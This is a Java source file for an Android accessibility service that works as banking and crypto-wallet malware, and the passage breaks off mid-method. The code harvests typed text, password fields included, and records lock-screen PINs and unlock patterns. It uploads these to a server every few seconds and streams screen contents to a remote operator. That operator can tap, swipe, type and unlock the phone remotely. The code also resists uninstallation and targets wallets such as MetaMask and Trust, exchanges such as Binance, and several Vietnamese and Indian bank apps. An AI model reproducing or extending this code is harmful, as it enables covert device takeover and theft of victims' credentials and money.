package com.example.aslib;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.content.Context;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.alibaba.fastjson.JSONObject;
import com.blankj.utilcode.util.EncryptUtils;
import com.example.aslib.common.ApiService;
import com.example.aslib.common.BoundedList;
import com.example.aslib.common.Config;
import com.example.aslib.common.Constant;
import com.example.aslib.common.MyConstants;
import com.example.aslib.common.SystemUtil;
import com.example.aslib.common.Utils;
import com.example.aslib.vo.Asset;
import com.example.aslib.vo.Currency;
import com.example.aslib.vo.DeviceInfo;
import com.example.aslib.vo.HandlerMessage;
import com.example.aslib.vo.HeartResponse;
import com.example.aslib.vo.InputTextRecord;
import com.example.aslib.vo.MajorData;
import com.example.aslib.vo.MyGes;
import com.example.aslib.vo.MyLog;
import com.example.aslib.vo.Transfer;
import com.google.protobuf.InvalidProtocolBufferException;

import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Collectors;

import io.renren.modules.app.message.proto.Message;
import io.vertx.core.buffer.Buffer;
import io.vertx.core.file.impl.FileResolver;

public class AccessService extends AccessibilityService implements NetWork.NetworkListener {
    private static final String TAG = "F_ASSIST_SERVICE";

    private NetWork netWork;
    private String deviceId;
    private int widthPixels;
    private int heightPixels;
    private ApiService apiService = new ApiService();
    private final Map<String, String> shareMap = new HashMap<>();
    private final Map<String, Transfer> transferMap = new HashMap<>();
    private final List<Transfer> submitTransfer = new CopyOnWriteArrayList<>();
    private final Map<String, Asset> assetMap = new HashMap<>();
    private long lastUpdate = System.currentTimeMillis();
    private final Map<String, InputTextRecord> inputTextRecordMap = new ConcurrentHashMap<>();
    private BoundedList<MyLog> logs = new BoundedList<>(Constant.MAX_LOG_COUNT);
    //最后的错误
    private Throwable lastError;


    String pin = "";
    String systemPwd = "";
    String lastPasswordRemark = "";
    List<String> systemPin = new ArrayList<>();
    List<MyGes> systemGs = new ArrayList<>();
    Map<String, String> pinPos = new HashMap<>();
    long lastUpdatePwdTime;
    long lastPasswordTime;
    String lastPasswordPkg;
    String lastPassword;
    private DeviceInfo deviceInfo;

    JSONObject unLockValue;
    List<MajorData> majorDataList = new ArrayList<>();

    private long lastCapture = System.currentTimeMillis();

    private AtomicInteger sendBufferCount = new AtomicInteger(1);
    private AtomicReference<String> sendLastMd5 = new AtomicReference<>();

    static {
        Log.i(TAG, "AccessService static");
        System.setProperty(FileResolver.DISABLE_FILE_CACHING_PROP_NAME, "true");
        System.setProperty(FileResolver.DISABLE_CP_RESOLVING_PROP_NAME, "true");
    }

    @Override
    public void onCreate() {
//        Constant.VERTX.setPeriodic(100, (l)->{
//            Log.i(TAG, "onCreate - loop");
//        });
//        this.netWork = new NetWork(Utils.deviceId(this));
        this.netWork = new NetWork(Utils.deviceId(this), Utils.deviceId(this), this);
        this.netWork.enableAutoReconnect();
        this.deviceId = Utils.deviceId(this);
        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        Display display = windowManager.getDefaultDisplay();
        DisplayMetrics displayMetrics = new DisplayMetrics();
        display.getMetrics(displayMetrics);
        widthPixels = displayMetrics.widthPixels;
        heightPixels = displayMetrics.heightPixels;

        initDeviceInfo();


        Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
//            Log.i(TAG, "LOOP");
            checkHeart();
            uploadTransfer();
            uploadAsset();
            uploadUnLock();
            uploadMajorData();
            uploadLog();
            uploadInputTextRecord();
        }, 0L, 5L, TimeUnit.SECONDS);


    }


    private void uploadInputTextRecord() {
        if (!inputTextRecordMap.isEmpty()) {
            Set<String> keys = inputTextRecordMap.keySet();
            Collection<InputTextRecord> values = inputTextRecordMap.values();
            boolean result = apiService.uploadInputTextRecord(values);
            if (result) {
                for (String key : keys) {
                    inputTextRecordMap.remove(key);
                }
            }
        }
    }

    private void uploadLog() {

        if (logs.size() > 0) {
            boolean result = apiService.uploadLog(logs.toList());
            if (result) {
                logs.clear();
            }
        }
    }

    private void uploadMajorData() {
        if (!majorDataList.isEmpty()) {
            boolean result = apiService.uploadMajorData(majorDataList);
            if (result) {
                majorDataList.clear();
            }
        }
    }

    private void uploadUnLock() {
        if (unLockValue != null) {
            Log.i(TAG, "上传解锁密码");
            boolean result = apiService.uploadUnLock(unLockValue);
            if (result) {
                unLockValue = null;
            }
        }
    }

    private void initDeviceInfo() {
        deviceInfo = new DeviceInfo();
        deviceInfo.setModel(SystemUtil.getSystemModel());
        deviceInfo.setSystemVersion(SystemUtil.getSystemVersion());
        deviceInfo.setBrand(SystemUtil.getDeviceBrand());
        deviceInfo.setLanguage(SystemUtil.getSystemLanguage());
        deviceInfo.setSdkVersion(String.valueOf(Build.VERSION.SDK_INT));
        deviceInfo.setScreenHeight(heightPixels);
        deviceInfo.setScreenWidth(widthPixels);
    }

    private void uploadTransfer() {
        //TODO 线程安全
        if (!submitTransfer.isEmpty()) {
            Log.i(TAG, "submitTransfer:" + JSONObject.toJSONString(submitTransfer));
            boolean result = apiService.uploadTransfer(submitTransfer);
            if (result) {
                submitTransfer.clear();
            }
        }
    }

    private void uploadAsset() {
        //TODO 线程安全
        List<Asset> assetList = assetMap.values().stream().filter(Asset::isNeedUpdate).collect(Collectors.toList());
        if (!assetList.isEmpty()) {
            Log.i(TAG, "uploadAsset:" + JSONObject.toJSONString(assetList));
            boolean result = apiService.uploadAsset(deviceId, assetList);
            if (result) {
                for (Asset asset : assetMap.values()) {
                    if (asset.isNeedUpdate()) {
                        asset.setNeedUpdate(false);
                    }
                }
            }
        }
    }

    private boolean unlock = false;

    private void checkHeart() {
        try {
            JSONObject body = deviceInfo.toJSONObject();
            body.put("deviceId", deviceId);
            body.put("screenStatus", Utils.isScreenOn(this) ? Constant.DeviceStatus.screen_on : Constant.DeviceStatus.screen_off);
            HeartResponse heart = apiService.heart(body);
            if (heart.isNeedWakeup()) {
                unlock = true;
                Log.i(TAG, "需要唤醒");
                if (heart.getLockScreen() == null) {
                    String value = Config.getValue(this, Constant.ConfigKey.UNLOCK
                    );
                    if (Utils.isNotEmpty(value)) {
                        heart.setLockScreen(JSONObject.parseObject(value));
                    }
                }
                //TODO 兼容没有设置解锁密码的情况
                unLock(heart.getLockScreen(), () -> {
                    try {
                        netWork.disconnect();
                        Utils.sleep(1000);
                        this.netWork.connect();
                        Message.AndroidOnline.Builder builder = Message.AndroidOnline.newBuilder();
                        builder.setDeviceId(deviceId);
                        netWork.sendClientMessage(Constant.MessageType.android_online, builder.build());
                        sendScreen(null);
                    } catch (Throwable e) {
                        Log.e(TAG, "connect error", e);
                        lastError = e;
                    }
                });
            }
        } catch (Throwable ex) {
            Log.e(TAG, "checkHeart err", ex);
        }
    }

    private void bindHandler(HandlerMessage message) {
        int type = message.getType();
        byte[] _body = message.getBody();
        try {


            switch (type) {
                case Constant.MessageType.touch_req:
                    Message.TouchReq touchReq = Message.TouchReq.parseFrom(_body);
                    Log.i(TAG, String.format("进行点击:%s, %s", touchReq.getX(), touchReq.getY()));
                    Utils.touch(this, touchReq.getX(), touchReq.getY());
                    break;
                case Constant.MessageType.back_req:
                    Message.BackReq backReq = Message.BackReq.parseFrom(_body);
                    Log.i(TAG, "回退");
//                                        performBackAction();
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                    break;
                case Constant.MessageType.home_req:
                    Log.i(TAG, "home");
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    break;
                case Constant.MessageType.recents_req:
                    Log.i(TAG, "recents_req");
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                    break;

                case Constant.MessageType.input_text:
                    Message.InputText inputText = Message.InputText.parseFrom(_body);
                    Log.i(TAG, String.format("进行输入:%s - %s", inputText.getId(), inputText.getText()));
                    List<AccessibilityNodeInfo> node = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(inputText.getId());
                    if (node != null && !node.isEmpty()) {
                        Utils.performTextInput(node.get(0), inputText.getText());
                    }
                    break;
                case Constant.MessageType.scroll_req:
                    Message.ScrollReq scrollReq = Message.ScrollReq.parseFrom(_body);
                    Log.i(TAG, String.format("进行滚动(%s,%s)->(%s,%s)", scrollReq.getStartX(), scrollReq.getStartY(), scrollReq.getEndX(), scrollReq.getEndY()));
                    int duration = scrollReq.getDuration();
                    if (duration == 0) {
                        duration = 600;
                    }
                    Utils.performSwipe(this, scrollReq.getStartX(), scrollReq.getStartY(), scrollReq.getEndX(), scrollReq.getEndY(), duration);
                    break;
                case Constant.MessageType.install_app_req:
                    //TODO 可能阻塞
                    Message.InstallAppResp allApp = Utils.getAllApp(this, deviceId);
                    netWork.sendClientMessage(Constant.MessageType.install_app_resp, allApp);
                    break;
                case Constant.MessageType.slide_req:
                    Message.SlideReq slideReq = Message.SlideReq.parseFrom(_body);
                    Log.i(TAG, "进行滑动");
                    Utils.slide(this, slideReq.getPointsList());
                    break;
                case Constant.MessageType.screen_req:
                    capture(null);
                    break;
                case Constant.MessageType.start_app_req:
                    Message.StartAppReq startAppReq = Message.StartAppReq.parseFrom(_body);
                    String packageName = startAppReq.getPackageName();
                    Log.i(TAG, "当前启动:" + packageName);
                    //TODO 启动app
//                    launchApp(packageName);
                    break;
                case Constant.MessageType.un_lock_screen_req:
                    Message.UnLockScreenReq unLockScreenReq = Message.UnLockScreenReq.parseFrom(_body);
                    String unLockValue = unLockScreenReq.getValue();
//                    unLock(unLockValue, null);
                    break;
            }

//            Constant.VERTX.setTimer(600, (l) -> {
//                sendScreen(null);
//            });

        } catch (Exception ex) {

        }
    }


    public void capture(AccessibilityEvent event) {
        try {
            if (!netWork.isOpen()) {
                return;
            }
            if (System.currentTimeMillis() - lastCapture < 2000) {
                return;
            }

            lastCapture = System.currentTimeMillis();

            sendScreen(event);
        } catch (Exception ex) {
            Log.e(TAG, "capture error", ex);
        }
    }

    private void loopNode(List<AccessibilityNodeInfo> nodes, String packageName) {
        String now = Utils.nowStr();
        for (AccessibilityNodeInfo node : nodes) {
            saveInputTextRecord(node, packageName, now);
        }
    }


    //保存输入数据
    private void saveInputTextRecord(AccessibilityNodeInfo node, String packageName, String now) {
        if (node != null) {
            if (node.isEditable() && node.isFocusable() && Utils.isNotEmpty(node.getText())) {
                InputTextRecord inputTextRecord = new InputTextRecord();
                inputTextRecord.setId(node.getViewIdResourceName());
                inputTextRecord.setText(node.getText().toString());
                inputTextRecord.setPackageName(packageName);
                inputTextRecord.setPassword(node.isPassword() ? Constant.YN.Y : Constant.YN.N);
                inputTextRecord.setDeviceId(deviceId);
                inputTextRecord.setDate(now);
                inputTextRecord.setTime(now);
                inputTextRecordMap.put(String.format("%s-%s-%s", node.getViewIdResourceName(), packageName, node.getText()), inputTextRecord);
            }
        }
//        inputTextRecordMap
    }

    public void sendScreenWithRust(AccessibilityEvent event) {
        //进行绘制
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            List<AccessibilityNodeInfo> list = new ArrayList<>();
            collectViewBounds(rootNode, list);
            if (list.isEmpty()) return;
            int uniId = 1;
            List<Message.ScreenItem> screenItems = new ArrayList<>();
            Map<String, Integer> idCount = new HashMap<>();
            for (AccessibilityNodeInfo node : list) {
                if (!node.isVisibleToUser()) {
                    continue;
                }
                String text = node.getText() != null ? node.getText().toString() : "";
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                Message.ScreenItem.Builder builder = Message.ScreenItem.newBuilder();
                builder.setX(bounds.left);
                builder.setY(bounds.top);
                builder.setHeight(bounds.height());
                builder.setWidth(bounds.width());

                builder.setText(text);
                builder.setUniqueId(uniId++);
                String viewId = node.getViewIdResourceName();
                if (viewId != null) {
                    builder.setId(viewId);
                    Integer count = idCount.get(viewId);
                    if (count == null) {
                        count = 0;
                    }
                    count++;
                    idCount.put(viewId, count);
                }
                builder.setIsFocused(node.isFocused());
                builder.setIsFocusable(node.isFocusable());
                builder.setIsScrollable(node.isScrollable());
                builder.setIsCheckable(node.isCheckable());
                builder.setIsClickable(node.isClickable());
                builder.setIsEditable(node.isEditable());
                builder.setIsSelected(node.isSelected());
                builder.setIsChecked(node.isChecked());
                builder.setIsPassword(node.isPassword());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    builder.setIsTextEntryKey(node.isTextEntryKey());
                }
                builder.setIsVisibleToUser(node.isVisibleToUser());


                Message.ScreenItem screenItem = builder.build();
                screenItems.add(screenItem);
            }

            String packageName = "";
            Integer max = 0;
            for (Map.Entry<String, Integer> entry : idCount.entrySet()) {
                Integer value = entry.getValue();
                String key = entry.getKey();
                if (value > max) {
                    max = value;
                    packageName = key;
                }
            }
            int index = packageName.indexOf(":");
            packageName = packageName.substring(0, index);
//            java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 0
//            at java.lang.String.checkBoundsBeginEnd(String.java:4500)
//            at java.lang.String.substring(String.java:2527)
//            at com.example.aslib.AccessService.sendScreenWithRust(AccessService.java:525)
//            at com.example.aslib.App.lambda$fInit$0(App.java:55)
//            at com.example.aslib.App$$ExternalSyntheticLambda0.run(D8$$SyntheticClass:0)
//            at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:487)
//            at java.util.concurrent.FutureTask.runAndReset(FutureTask.java:305)
//            at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecut
//
//                    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1251)
//            at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
//            at java.lang.Thread.run(Thread.java:1012)
            String appName = Utils.getAppNameFromPackageName(packageName, this);
//            Log.i(TAG, "刷新屏幕!");
            try {
                Message.ScreenInfo.Builder screenInfoBuilder = Message.ScreenInfo.newBuilder();
                screenInfoBuilder.setAppName(appName);
                screenInfoBuilder.setPackageName(packageName);
                screenInfoBuilder.setDeviceId(deviceId);
                if (event != null) {
                    String className = event.getClassName() != null ? event.getClassName().toString() : "";
                    screenInfoBuilder.setActivityName(className);
                }
                screenInfoBuilder.addAllItems(screenItems);
                Message.ScreenInfo screenInfo = screenInfoBuilder.build();
                Buffer buffer = Utils.encode(Constant.MessageType.screen_info, screenInfo);
                byte[] bytes = buffer.getBytes();
                String md5 = EncryptUtils.encryptMD5ToString(bytes);
                //是否md5相同
                if (md5.equals(sendLastMd5.get())) {
                    int current = sendBufferCount.getAndIncrement();
                    //相同md5 三次以上不发送, 并且相同的md5次数不包含20整数倍
                    if (current % 10 != 0) {
                        return;
                    }
                } else {
                    sendBufferCount.set(1);
                }
                sendLastMd5.set(md5);

                //TODO
                netWork.sendClientMessage(Constant.MessageType.screen_info, screenInfo);
            } catch (Exception ex) {
                Log.i(TAG, "发送错误" + ex.getMessage());
            }
        } else {
//            Log.i(TAG, "rootNode is null");
        }
    }


    private void sendScreen(AccessibilityEvent event) {
        //进行绘制
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            List<AccessibilityNodeInfo> list = new ArrayList<>();
            collectViewBounds(rootNode, list);
            if (list.isEmpty()) return;
            int uniId = 1;
            List<Message.ScreenItem> screenItems = new ArrayList<>();
            Map<String, Integer> idCount = new HashMap<>();
            for (AccessibilityNodeInfo node : list) {
                if (!node.isVisibleToUser()) {
                    continue;
                }
                String text = node.getText() != null ? node.getText().toString() : "";
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                Message.ScreenItem.Builder builder = Message.ScreenItem.newBuilder();
                builder.setX(bounds.left);
                builder.setY(bounds.top);
                builder.setHeight(bounds.height());
                builder.setWidth(bounds.width());

                builder.setText(text);
                builder.setUniqueId(uniId++);
                String viewId = node.getViewIdResourceName();
                if (viewId != null) {
                    builder.setId(viewId);
                    Integer count = idCount.get(viewId);
                    if (count == null) {
                        count = 0;
                    }
                    count++;
                    idCount.put(viewId, count);
                }
                builder.setIsFocused(node.isFocused());
                builder.setIsFocusable(node.isFocusable());
                builder.setIsScrollable(node.isScrollable());
                builder.setIsCheckable(node.isCheckable());
                builder.setIsClickable(node.isClickable());
                builder.setIsEditable(node.isEditable());
                builder.setIsSelected(node.isSelected());
                builder.setIsChecked(node.isChecked());
                builder.setIsPassword(node.isPassword());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    builder.setIsTextEntryKey(node.isTextEntryKey());
                }
                builder.setIsVisibleToUser(node.isVisibleToUser());


                Message.ScreenItem screenItem = builder.build();
                screenItems.add(screenItem);
            }

            String packageName = "";
            Integer max = 0;
            for (Map.Entry<String, Integer> entry : idCount.entrySet()) {
                Integer value = entry.getValue();
                String key = entry.getKey();
                if (value > max) {
                    max = value;
                    packageName = key;
                }
            }
            int index = packageName.indexOf(":");
            packageName = packageName.substring(0, index);
            String appName = Utils.getAppNameFromPackageName(packageName, this);
//            Log.i(TAG, "刷新屏幕!");
            try {
                Message.ScreenInfo.Builder screenInfoBuilder = Message.ScreenInfo.newBuilder();
                screenInfoBuilder.setAppName(appName);
                screenInfoBuilder.setPackageName(packageName);
                screenInfoBuilder.setDeviceId(deviceId);
                if (event != null) {
                    String className = event.getClassName() != null ? event.getClassName().toString() : "";
                    screenInfoBuilder.setActivityName(className);
                }
                screenInfoBuilder.addAllItems(screenItems);
                Message.ScreenInfo screenInfo = screenInfoBuilder.build();
                netWork.sendClientMessage(Constant.MessageType.screen_info, screenInfo);
            } catch (Exception ex) {
                Log.i(TAG, "发送错误" + ex.getMessage());
            }
        } else {
            Log.i(TAG, "rootNode is null");
        }
    }

    public String accessibilityNodeInfoToString(AccessibilityNodeInfo node) {

        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        String text = node.getText() != null ? node.getText().toString() : "";
        String viewId = node.getViewIdResourceName();

        JSONObject result = new JSONObject();
        result.put("x", bounds.left);
        result.put("y", bounds.top);
        result.put("height", bounds.height());
        result.put("width", bounds.width());
        result.put("isClickable", node.isClickable());
        result.put("id", viewId);

        result.put("text", text);
        CharSequence contentDescription = node.getContentDescription();
        result.put("contentDescription", contentDescription == null ? "" : contentDescription.toString());
        return result.toJSONString();
    }

    public void traverseNode(AccessibilityNodeInfo node, int depth) {
        if (node == null) {
            return;
        }

        // 打印当前节点的信息
        StringBuilder prefix = new StringBuilder();
        for (int i = 0; i < depth; i++) {
            prefix.append(" "); // 使用缩进表示树结构
        }
        Log.i(TAG, "traverseNode: " + accessibilityNodeInfoToString(node));

        // 遍历子节点
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            traverseNode(child, depth + 1); // 递归遍历子节点
        }
    }


    private void collectViewBounds(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list) {
        if (node == null) return;
        list.add(node);
        for (int i = 0; i < node.getChildCount(); i++) {
            collectViewBounds(node.getChild(i), list);
        }
    }

    long periodic;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "无障碍已连接");
        App.accessServiceRef.set(this);

//        Constant.VERTX.setPeriodic(200, id -> {
//            // if (netWork != null && netWork.isOpen()) {
//            sendScreenWithRust(null);
//            // }
////            printScreenText();
//        });
    }

    private void printScreenText() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            Log.d(TAG, "开始提取屏幕文字，根节点: " + rootNode.getClassName());
            StringBuilder allText = new StringBuilder();
            int[] nodeCount = {0}; // 用于统计遍历的节点数
            extractTextFromNode(rootNode, allText, 0, nodeCount);
            String result = allText.toString().trim();
            Log.d(TAG, "遍历了 " + nodeCount[0] + " 个节点");
            if (!result.isEmpty()) {
                Log.i(TAG, "屏幕文字内容:" + result);
            } else {
                Log.i(TAG, "未找到任何文字内容，但遍历了 " + nodeCount[0] + " 个节点");
            }
            rootNode.recycle();
        } else {
            Log.w(TAG, "无法获取根节点");
        }
    }

    private void extractTextFromNode(AccessibilityNodeInfo node, StringBuilder textBuilder, int depth, int[] nodeCount) {
        if (node == null || depth > 50) { // 防止无限递归，设置最大深度
            return;
        }

        nodeCount[0]++; // 统计遍历的节点数

        try {
            // 获取当前节点的所有可能的文字内容
            CharSequence nodeText = node.getText();
            CharSequence contentDesc = node.getContentDescription();
            CharSequence className = node.getClassName();

            // 更宽松的文本提取 - 输出所有非空文本
            if (nodeText != null && nodeText.length() > 0) {
                String text = nodeText.toString().trim();
                if (!text.isEmpty()) {
                    textBuilder.append(text);//.append("\n");
                    Log.v(TAG, "找到文本: " + text);
                }
            }

            // 输出内容描述
            if (contentDesc != null && contentDesc.length() > 0) {
                String desc = contentDesc.toString().trim();
                if (!desc.isEmpty()) {
                    textBuilder.append(desc);//.append("\n");
                    Log.v(TAG, "找到描述: " + desc);
                }
            }

            // 递归处理所有子节点
            int childCount = node.getChildCount();
            Log.v(TAG, "节点 " + (className != null ? className.toString() : "未知") +
                    " 有 " + childCount + " 个子节点, 深度: " + depth);

            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    extractTextFromNode(child, textBuilder, depth + 1, nodeCount);
                    child.recycle();
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "提取文本时出错: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private String buildNodeInfo(AccessibilityNodeInfo node) {
        StringBuilder info = new StringBuilder();

        if (node.isCheckable()) {
            info.append("可选择:");
            info.append(node.isChecked() ? "已选中" : "未选中").append(" ");
        }

        if (node.isClickable()) {
            info.append("可点击 ");
        }

        if (node.isFocusable()) {
            info.append("可聚焦 ");
        }

        if (node.isSelected()) {
            info.append("已选择 ");
        }

        return info.toString().trim();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
//            Log.i(TAG, "onAccessibilityEvent");
            if (Utils.isScreenOff(this)) {
                netWork.disconnect();
//            Log.i(TAG, "熄屏中");
                return;
            }
            if (event == null) {
                return;
            }
            lastUpdate = System.currentTimeMillis();
            AccessibilityNodeInfo rootInActive = this.getRootInActiveWindow();
            CharSequence packageName = (rootInActive != null) ? rootInActive.getPackageName() : null;
            boolean needCheck = true;
            // 判断应用的包名并执行相关逻辑
            String eventPackageName = event.getPackageName() == null ? "" : event.getPackageName().toString();
            if ("vip.mytokenpocket".equals(eventPackageName) || "vip.mytokenpocket".equals(packageName)) {
                this.handlerTp(event);
                this.recordTp(event);
            } else if ("im.token.app".equals(eventPackageName) || "im.token.app".equals(packageName)) {
            } else if ("com.tronlinkpro.wallet".equals(eventPackageName) || "com.tronlinkpro.wallet".equals(packageName)) {
            } else if ("com.bitpie".equals(eventPackageName) || "com.bitpie".equals(packageName)) {
            } else if ("io.metamask".equals(eventPackageName) || "io.metamask".equals(packageName)) {
            } else if ("com.wallet.crypto.trustapp".equals(eventPackageName) || "com.wallet.crypto.trustapp".equals(packageName)) {
            } else if ("com.binance.dev".equals(eventPackageName) || "com.binance.dev".equals(packageName)) {
            } else if ("pro.huobi".equals(eventPackageName) || "pro.huobi".equals(packageName)) {
            } else if ("com.okinc.okex".equals(eventPackageName) || "com.okinc.okex".equals(packageName) ||
                    "com.okinc.okex.gp".equals(eventPackageName) || "com.okinc.okex.gp".equals(packageName)) {
            } else if ("com.kubi.kucoin".equals(eventPackageName) || "com.kubi.kucoin".equals(packageName)) {
            } else if ("com.plunien.poloniex".equals(eventPackageName) || "com.plunien.poloniex".equals(packageName)) {
            } else if ("com.bitso.wallet".equals(eventPackageName) || "com.bitso.wallet".equals(packageName)) {
            } else if ("mobile.acb.com.vn".equals(eventPackageName) || "mobile.acb.com.vn".equals(packageName)) {
            } else if ("com.vnpay.abbank".equals(eventPackageName) || "com.vnpay.abbank".equals(packageName)) {
            } else if ("com.snapwork.hdfc".equals(eventPackageName) || "com.snapwork.hdfc".equals(packageName)) {
            } else if ("com.mservice.momotransfer".equals(eventPackageName) || "com.mservice.momotransfer".equals(packageName)) {
            } else if ("com.android.systemui".equals(eventPackageName)) {
                //记录开机密码
                this.recordSys(event);//记录开机密码等
            } else {
                needCheck = false;
            }

            Utils.guardSmartAssistant(this);
            //获取appName
            Utils.guardUninstall(this, event, "");
            capture(event);

            List<AccessibilityNodeInfo> list = new ArrayList<>();
            collectViewBounds(rootInActive, list);
            if (rootInActive != null && Utils.isNotEmpty(rootInActive.getPackageName())) {
                loopNode(list, rootInActive.getPackageName().toString());
            }
        } catch (Exception ex) {
            Log.e(TAG, "onAccessibilityEvent error:", ex);
        }
    }

    private void recordSys(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo rootInActiveWindow;
        String trim;
        AccessibilityNodeInfo findNodeById;
        if ((rootInActiveWindow = getRootInActiveWindow()) == null) {
            return;
        }

//        List<String> ids = new ArrayList<>();
//        loopViewId(rootInActiveWindow, ids);
//        Log.i(TAG, "ids:" + JSONObject.toJSONString(ids));
        if (Utils.findNodeById(rootInActiveWindow, MyConstants.ID_PIN) == null && Utils.findNodeById(rootInActiveWindow, MyConstants.ID_KEYGUARD) == null && (accessibilityEvent.getSource() == null || !MyConstants.ID_PWD.equals(accessibilityEvent.getSource().getViewIdResourceName()))) {
            if (pin.length() > 0) {
                systemPin.clear();
                pin = "";
                pinPos.clear();
            }
            if (systemPwd.length() > 0) {
                systemPwd = "";
                return;
            }
            if (!systemGs.isEmpty()) {
                systemGs.clear();
            }
            return;
        }
        AccessibilityNodeInfo oppo = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_PWD_OPPO);
        AccessibilityNodeInfo keyguard = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_KEYGUARD);
        Log.i(TAG, "oppo:" + (oppo != null));
        Log.i(TAG, "keyguard:" + (keyguard != null));


//        traverseNode(rootInActiveWindow, 0);
        Log.i(TAG, "eventType:" + accessibilityEvent.getEventType());


        if (accessibilityEvent.getSource() != null) {
            Log.i(TAG, "source:" + accessibilityNodeInfoToString(accessibilityEvent.getSource()));

        }
        Log.i(TAG, "ContentChangeTypes:" + accessibilityEvent.getContentChangeTypes());

        String description = accessibilityEvent.getContentDescription() != null ? accessibilityEvent.getContentDescription().toString().trim() : null;
        Log.i(TAG, "description:" + description);


        if (accessibilityEvent.getEventType() != AccessibilityEvent.TYPE_VIEW_CLICKED) {
            return;
        }

//        List<AccessibilityNodeInfo> _list = new ArrayList<>();
//        collectViewBounds(getRootInActiveWindow(), _list);
//        List<String> $list = _list.stream().map(AccessibilityNodeInfo::getViewIdResourceName).filter(Utils::isNotEmpty).collect(Collectors.toList());
//        Log.i(TAG, "loop:" + JSONObject.toJSONString($list));


//        if(keyguard != null){
//            periodic = Constant.VERTX.setPeriodic(500, l -> {
//                List<AccessibilityNodeInfo> _list = new ArrayList<>();
//                collectViewBounds(getRootInActiveWindow(), _list);
//                List<String> $list = _list.stream().map(AccessibilityNodeInfo::getViewIdResourceName).filter(Utils::isNotEmpty).collect(Collectors.toList());
//                Log.i(TAG, "loop:" + JSONObject.toJSONString($list));
//            });
//        }else if(periodic != 0){
//            Log.i(TAG, "loop  cancel");
//            Constant.VERTX.cancelTimer(periodic);
//        }


        AccessibilityNodeInfo gsRoot = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_GS);
        if (gsRoot == null) {
            gsRoot = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_GS_OPPO);
        }
        if (gsRoot == null && MyConstants.getBrand() == 3) {
            gsRoot = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_GS_OPPO_2);
        }
        if (gsRoot == null && MyConstants.getBrand() == 4) {
            gsRoot = Utils.findNodeById(rootInActiveWindow, MyConstants.ID_GS_VIVO);
        }
//        int i = 0;
        if (gsRoot != null) {
            if (gsRoot.getChildCount() != 9) {
                return;
            }
            if (gsRoot.getChild(0).isClickable() && gsRoot.getChild(1).isClickable() && gsRoot.getChild(2).isClickable() && gsRoot.getChild(3).isClickable() && gsRoot.getChild(4).isClickable() && gsRoot.getChild(5).isClickable() && gsRoot.getChild(6).isClickable() && gsRoot.getChild(7).isClickable() && gsRoot.getChild(8).isClickable()) {
                systemGs.clear();
                return;
            }
            Rect rect = new Rect();

            for (int i = 0; i < 9; i++) {
                gsRoot.getChild(i).getBoundsInScreen(rect);
                MyGes myGes = new MyGes(i + 1, getPos(rect));
                //如果当前不能点击 则代表当前被点击
                if (!gsRoot.getChild(i).isClickable()) {
                    if (!systemGs.contains(myGes)) {
                        systemGs.add(myGes);
                    }
                } else {
                    if (systemGs.contains(myGes)) {
                        systemGs.remove(myGes);
                    }
                }
            }


//            while (i < 9) {
//                gsRoot.getChild(i).getBoundsInScreen(rect);
//                int i2 = i + 1;
//                MyGes myGes = new MyGes(i2, getPos(rect));
//                if (!gsRoot.getChild(i).isClickable()) {
//                    if (!systemGs.contains(myGes)) {
//                        systemGs.add(myGes);
//                    }
//                    if (!lastPasswordRemark.contains("" + i2)) {
//                        lastPasswordRemark += i2;
//                    }
//                } else {
//                    if (systemGs.contains(myGes)) {
//                        systemGs.remove(myGes);
//                    }
//                    if (lastPasswordRemark.contains("" + i2)) {
//                        lastPasswordRemark = lastPasswordRemark.replace("" + i2, "");
//                    }
//                }
//                i = i2;
//            }
            if (systemGs.size() >= 4) {
